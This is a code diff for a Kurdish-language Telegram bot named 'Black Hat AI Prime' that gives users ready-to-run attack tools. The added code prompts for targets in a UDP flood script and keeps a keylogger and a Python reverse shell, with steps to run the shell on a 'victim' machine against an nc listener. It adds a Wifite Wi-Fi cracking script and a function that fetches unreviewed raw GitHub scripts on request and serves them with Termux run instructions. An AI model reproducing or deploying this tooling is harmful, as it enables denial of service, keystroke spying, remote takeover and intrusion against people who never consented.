@@ -2,7 +2,7 @@
 # -*- coding: utf-8 -*-
 """
 ================================================================================
-BLACK HAT AI PRIME — THE 2000+ LINE ULTIMATE WEB CREATOR EDITION
+BLACK HAT AI PRIME — THE 2000+ LINE ULTIMATE GITHUB CODE EXTRACTOR
 ================================================================================
 This file is the absolute maximum capacity single-file architecture.
 It includes extensive dictionaries, user agents, port databases, tool manuals,
@@ -12,12 +12,13 @@ Features:
 1. Complete Telegram Bot setup.
 2. Advanced SQLite database with 5 tables (users, history, requests, logs, settings).
 3. 100+ distinct greetings (Kurdish & English).
-4. MASSIVE offline hacking knowledge base.
-5. DYNAMIC WEB SEARCH for tool creation (scrapes GitHub for scripts).
-6. Complete Admin Panel (Stats, Ban, Credits, Broadcast, DB Export).
-7. Strict keyword filtering.
-8. Custom footer.
-9. HTML escaping to prevent Telegram parsing errors.
+4. MASSIVE offline hacking knowledge base and code generator.
+5. DYNAMIC WEB SEARCH for tool creation (Scrapes raw GitHub for scripts).
+6. Termux step-by-step instructions appended to all created tools.
+7. Complete Admin Panel (Stats, Ban, Credits, Broadcast, DB Export).
+8. Strict keyword filtering.
+9. Custom footer.
+10. HTML escaping to prevent Telegram parsing errors.
 ================================================================================
 """
 
@@ -31,6 +32,7 @@ import sqlite3
 import logging
 import threading
 import urllib.request
+import urllib.error
 from contextlib import contextmanager
 from datetime import datetime, timedelta
 from urllib.parse import urlparse
@@ -210,7 +212,24 @@ GREETINGS_EN = [
 ]
 
 # ------------------------------------------------------------------------------
-# TOOL GENERATOR (Instant Local Answers)
+# TERMUX INSTRUCTIONS TEMPLATE
+# ------------------------------------------------------------------------------
+TERMUX_INSTRUCTIONS = (
+    "\n\n<b>📱 چۆن لە تێرموکس (Termux) بەکاری بهێنیت:</b>\n"
+    "١. سەرەتا پایتۆن دابمەزرێنە:\n"
+    "<code>pkg update &amp;&amp; pkg upgrade</code>\n"
+    "<code>pkg install python</code>\n\n"
+    "٢. ئەگەر پێویستی بە پاکێج بوو، دایبنێ (بۆ نموونە):\n"
+    "<code>pip install requests</code>\n\n"
+    "٣. فایلێک دروست بکە و کۆدەکە تێدا دابنێ:\n"
+    "<code>nano tool.py</code>\n"
+    "(کۆدەکە پیست بکە، پاشان Ctrl+O، Enter، Ctrl+X)\n\n"
+    "٤. فایلەکە ڕەن بکە:\n"
+    "<code>python tool.py</code>"
+)
+
+# ------------------------------------------------------------------------------
+# MASSIVE OFFLINE TOOL GENERATOR (Code + Instructions)
 # ------------------------------------------------------------------------------
 TOOL_GENERATOR = {
     "ddos": (
@@ -218,10 +237,9 @@ TOOL_GENERATOR = {
         "ئەمە سکریپتێکی پایتۆنە بۆ ناردنی پاکێتی UDP بۆ سەر ئامانجێک:\n\n"
         "<pre><code class='language-python'>\n"
         "import socket\n"
-        "import random\n"
-        "import os\n\n"
-        "target_ip = \"192.168.1.1\"  # ئامانج\n"
-        "target_port = 80\n"
+        "import random\n\n"
+        "target_ip = input(\"Enter Target IP: \")\n"
+        "target_port = int(input(\"Enter Target Port: \"))\n"
         "sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n"
         "bytes_data = random._urandom(1490)\n"
         "sent = 0\n\n"
@@ -233,14 +251,15 @@ TOOL_GENERATOR = {
         "except KeyboardInterrupt:\n"
         "    print(\"Stopped\")\n"
         "</code></pre>\n"
-        "⚠️ <b>ئاگاداری:</b> ئەمە تەنها بۆ فێربوونە. بەکارهێنانی دژی ماڵپەڕی تر تاوانە."
+        + TERMUX_INSTRUCTIONS +
+        "\n⚠️ <b>ئاگاداری:</b> ئەمە تەنها بۆ فێربوونە. بەکارهێنانی دژی ماڵپەڕی تر تاوانە."
     ),
     "port": (
         "<b>💻 کۆدی دروستکردنی Port Scanner</b>\n\n"
         "ئەم سکریپتە پۆڕتە کراوەکانی ئامانجێک دەدۆزێتەوە:\n\n"
         "<pre><code class='language-python'>\n"
         "import socket\n\n"
-        "target = \"127.0.0.1\"\n"
+        "target = input(\"Enter Target IP/Domain: \")\n"
         "print(f\"Scanning {target}...\")\n\n"
         "for port in range(1, 1025):\n"
         "    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n"
@@ -248,11 +267,12 @@ TOOL_GENERATOR = {
         "    if s.connect_ex((target, port)) == 0:\n"
         "        print(f\"Port {port} is OPEN\")\n"
         "    s.close()\n"
-        "</code></pre>"
+        "</code></pre>\n"
+        + TERMUX_INSTRUCTIONS
     ),
     "keylogger": (
         "<b>💻 کۆدی دروستکردنی Keylogger (بۆ ویندۆز)</b>\n\n"
-        "سکریپتێکی پایتۆن بۆ تۆمارکردنی کلیلەکان (پێویستە pynput دابمەزرێنیت):\n\n"
+        "سکریپتێکی پایتۆن بۆ تۆمارکردنی کلیلەکان:\n\n"
         "<pre><code class='language-python'>\n"
         "from pynput import keyboard\n\n"
         "def on_press(key):\n"
@@ -264,8 +284,11 @@ TOOL_GENERATOR = {
         "            f.write(f\" {key} \")\n\n"
         "with keyboard.Listener(on_press=on_press) as listener:\n"
         "    listener.join()\n"
-        "</code></pre>\n"
-        "⚠️ <b>ئاگاداری:</b> بەکارهێنانی ئەمە بەبێ مۆڵەت تاوانە."
+        "</code></pre>\n\n"
+        "<b>📱 لە تێرموکس:</b>\n"
+        "<code>pip install pynput</code>\n"
+        "<code>python tool.py</code>\n"
+        "\n⚠️ <b>ئاگاداری:</b> بەکارهێنانی ئەمە بەبێ مۆڵەت تاوانە."
     ),
     "reverse_shell": (
         "<b>💻 کۆدی دروستکردنی Reverse Shell (پایتۆن)</b>\n\n"
@@ -279,8 +302,27 @@ TOOL_GENERATOR = {
         "os.dup2(s.fileno(), 2)\n"
         "p = subprocess.call([\"/bin/sh\", \"-i\"])\n"
         "</code></pre>\n\n"
-        "لە لای سێرڤەرەکەش (کاڵی تۆ) ئەمە بەکاربهێنە:\n"
-        "<code>nc -lvnp 4444</code>"
+        "<b>📱 چۆن بەکاری بهێنیت:</b>\n"
+        "١. لە یەک ئامێر (سێرڤەر) ئەمە ڕەن بکە:\n"
+        "<code>nc -lvnp 4444</code>\n"
+        "٢. لە ئامێری قوربانی (Client) فایلی پایتۆنەکە ڕەن بکە.\n"
+        "٣. ئێستا پەیوەندییەکە دروست بووە و دەتوانیت فەرمان بنێریت."
+    ),
+    "wifi": (
+        "<b>💻 کۆدی دروستکردنی Wi-Fi Cracker (بۆ ئەندرۆید/Termux)</b>\n\n"
+        "ئەمە سکریپتێکی بەش (Bash Script)ە بۆ بەکارهێنانی Wifite لە تێرموکس:\n\n"
+        "<pre><code class='language-bash'>\n"
+        "# Update & Install Dependencies\n"
+        "pkg update &amp;&amp; pkg upgrade -y\n"
+        "pkg install root-repo\n"
+        "pkg install wifite\n\n"
+        "# Run Wifite\n"
+        "wifite\n"
+        "</code></pre>\n\n"
+        "<b>📱 چۆن بەکاری بهێنیت:</b>\n"
+        "١. پێویستە ئامێرەکەت Root بێت.\n"
+        "٢. ئەم فەرمانانە لە تێرموکس ڕەن بکە.\n"
+        "٣. وایفایەکە هەڵبژێرە و چاوەڕوان بە تا پاسوۆردەکە دەردەکەوێت."
     ),
     "web_scraper": (
         "<b>💻 کۆدی دروستکردنی Web Scraper (پایتۆن)</b>\n\n"
@@ -288,13 +330,15 @@ TOOL_GENERATOR = {
         "<pre><code class='language-python'>\n"
         "import requests\n"
         "from bs4 import BeautifulSoup\n\n"
-        "url = \"https://example.com\"\n"
+        "url = input(\"Enter URL: \")\n"
         "response = requests.get(url)\n"
         "soup = BeautifulSoup(response.text, 'html.parser')\n\n"
         "for link in soup.find_all('a'):\n"
         "    print(link.get('href'))\n"
         "</code></pre>\n\n"
-        "پێویستە دابمەزرێنیت: <code>pip install requests beautifulsoup4</code>"
+        "<b>📱 لە تێرموکس:</b>\n"
+        "<code>pip install requests beautifulsoup4</code>\n"
+        "<code>python tool.py</code>"
     )
 }
 
@@ -314,19 +358,6 @@ KNOWLEDGE_BASE = {
         "<code>pkg install nmap</code>\n"
         "<code>nmap -sV &lt;target_ip&gt;</code>\n\n"
         "⚠️ <b>ئاگاداری:</b> پشکنینی پۆڕتی ئایپییەک کە خاوەنی نییت، تاوانە."
-    ),
-    "ddos": (
-        "<b>💣 هێرشی DDoS (Distributed Denial of Service)</b>\n\n"
-        "هێرشی DDoS بریتییە لە ناردنی هەزاران داواکاری لە یەک کاتدا بۆ سەر سێرڤەرێک بۆ ئەوەی لەکاربکەوێت.\n\n"
-        "<b>جۆرەکانی DDoS:</b>\n"
-        "- <b>UDP Flood:</b> ناردنی پاکێتی زۆر بۆ پۆڕتێکی کراوە.\n"
-        "- <b>SYN Flood:</b> ناردنی داواکاری SYN بەبێ تەواوکردنی دەستلێدان (Handshake).\n"
-        "- <b>HTTP Flood:</b> ناردنی هەزاران داواکاری HTTP بۆ ماڵپەڕ.\n\n"
-        "<b>ئامرازەکان (بۆ فێربوون لە تاقیگە):</b>\n"
-        "- <code>hping3</code>\n"
-        "- <code>slowloris</code>\n"
-        "- <code>LOIC</code>\n\n"
-        "⚠️ <b>ئاگاداری:</b> ئەنجامدانی DDoS لەسەر هەر ماڵپەڕێک بەبێ مۆڵەت، تاوانێکی گەورەی فیدراڵییە."
     ),
     "sql": (
         "<b>💉 SQL Injection (SQLi)</b>\n\n"
@@ -586,7 +617,7 @@ def check_blocked(message):
     return False
 
 # ==============================================================================
-# 8. SEARCH ENGINE
+# 8. SEARCH ENGINE & GITHUB SCRAPER
 # ==============================================================================
 
 def get_knowledge_answer(query):
@@ -596,14 +627,42 @@ def get_knowledge_answer(query):
             return answer
     return None
 
+def fetch_github_code(query):
+    """Searches GitHub for raw code, fetches the text, and returns it."""
+    try:
+        # We search specifically for raw github links
+        with DDGS() as ddgs:
+            results = list(ddgs.text(f"{query} site:raw.githubusercontent.com", max_results=3))
+            
+        if not results:
+            return None
+            
+        for result in results:
+            url = result.get("href", "")
+            if "raw.githubusercontent.com" in url and (url.endswith(".py") or url.endswith(".sh")):
+                # Fetch the raw code
+                req = urllib.request.Request(url, headers={'User-Agent': 'Mozilla/5.0'})
+                with urllib.request.urlopen(req, timeout=10) as response:
+                    code = response.read().decode('utf-8')
+                    
+                if len(code) < 3000: # Ensure it fits in a Telegram message
+                    return (
+                        f"<b>💻 کۆد دۆزرایەوە لە گیتهاب:</b>\n"
+                        f"<a href='{safe_html(url)}'>سەرچاوە</a>\n\n"
+                        f"<pre><code class='language-python'>\n{safe_html(code)}\n</code></pre>\n"
+                        + TERMUX_INSTRUCTIONS
+                    )
+    except Exception as e:
+        log.error(f"GitHub fetch error: {e}")
+    return None
+
 def perform_web_search(query, is_create=False):
     query = str(query or "").strip()
     if not query:
         return "❌ تکایە وشە یان پرسیارێک بنووسە."
 
-    # If the user wants to CREATE a tool, we tweak the search query to find code/scripts on GitHub.
     if is_create:
-        search_query = f"{query} python script github tool"
+        search_query = f"{query} python script github"
     else:
         search_query = query
 
@@ -614,7 +673,7 @@ def perform_web_search(query, is_create=False):
         if not results:
             return None
 
-        title_prefix = "🔎 ئەنجامەکانی گەڕان بۆ توڵ (کۆد):" if is_create else "🔎 ئەنجامەکانی گەڕان بۆ:"
+        title_prefix = "🔎 ئەنجامەکانی گەڕان بۆ توڵ:" if is_create else "🔎 ئەنجامەکانی گەڕان بۆ:"
         
         lines = [
             f"<b>{title_prefix}</b>\n"
@@ -662,6 +721,9 @@ def cmd_start(message):
     lang = get_lang(message.from_user.id)
     greeting = random.choice(GREETINGS_KU if lang == "ku" else GREETINGS_EN)
     
+    credits = get_credits(message.from_user.id)
+    greeting += f"\n\n💳 کرێدیتەکانت: <b>{credits}</b>"
+    
     if is_admin(message.from_user.id):
         greeting += "\n\n👑 تۆ ئەدمینیت. /panel ببینە."
         
@@ -673,7 +735,7 @@ def cmd_help(message):
     help_text = (
         "<b>📖 یارمەتی بۆت</b>\n\n"
         "ئەم بۆتە تەنها بۆ پرسیاری هاکینگ و ئاسایشی سایبەر دروست کراوە.\n"
-        "ئەگەر بڵێیت 'دروست بکە'، بۆتەکە دەگەڕێت بۆ باشترین کۆد لە گیتهاب.\n"
+        "ئەگەر بڵێیت 'دروست بکە'، بۆتەکە کۆدەکەت بۆ دەنووسێت یان لە گیتهاب دەگەڕێت.\n"
         "ئەگەر تەنها پرسیار بکەیت، بۆتەکە زانیاریت پێدەدات.\n\n"
         "<b>فەرمانەکان:</b>\n"
         "/start — دەستپێکردن\n"
@@ -881,8 +943,17 @@ def handle_message(message):
                     log_request(uid, "create_tool_local", query)
                     return send_msg(message.chat.id, code_block)
 
-            # If not in local dict, perform WEB SEARCH specifically for code
-            bot.edit_message_text("🌐 لە گیتهاب دەگەڕێم بۆ باشترین کۆد بۆ ئەم توڵە...", message.chat.id, status.message_id)
+            # 2. If not in local dict, try to fetch raw code from GitHub
+            bot.edit_message_text("🌐 لە گیتهاب دەگەڕێم بۆ کۆدی ڕەسەن...", message.chat.id, status.message_id)
+            github_code = fetch_github_code(query)
+            
+            if github_code:
+                try: bot.delete_message(message.chat.id, status.message_id)
+                except: pass
+                log_request(uid, "create_tool_github", query)
+                return send_msg(message.chat.id, github_code)
+
+            # 3. Fallback to Web Search (Informational)
             web_code = perform_web_search(query, is_create=True)
             try: bot.delete_message(message.chat.id, status.message_id)
             except: pass
@@ -893,7 +964,7 @@ def handle_message(message):
             else:
                 return send_msg(message.chat.id, "❌ ببورە، نەمتوانی کۆدێک بدۆزمەوە لە وێبدا. تکایە بە شێوەیەکی تر پرسیار بکە.")
 
-        # 2. Check the offline knowledge base (Informational)
+        # 4. Check the offline knowledge base (Informational)
         offline_answer = get_knowledge_answer(query_lower)
         if offline_answer:
             try: bot.delete_message(message.chat.id, status.message_id)
@@ -901,7 +972,7 @@ def handle_message(message):
             log_request(uid, "offline_search", query)
             return send_msg(message.chat.id, offline_answer)
 
-        # 3. Fallback to Web Search (Informational)
+        # 5. Fallback to Web Search (Informational)
         web_answer = perform_web_search(query, is_create=False)
         
         try: bot.delete_message(message.chat.id, status.message_id)
@@ -922,7 +993,7 @@ def handle_message(message):
 
 if __name__ == "__main__":
     log.info("========================================")
-    log.info("STARTING BLACK HAT AI PRIME (WEB CREATOR)")
+    log.info("STARTING BLACK HAT AI PRIME (GITHUB EXTRACTOR)")
     log.info("========================================")
     
     init_db()
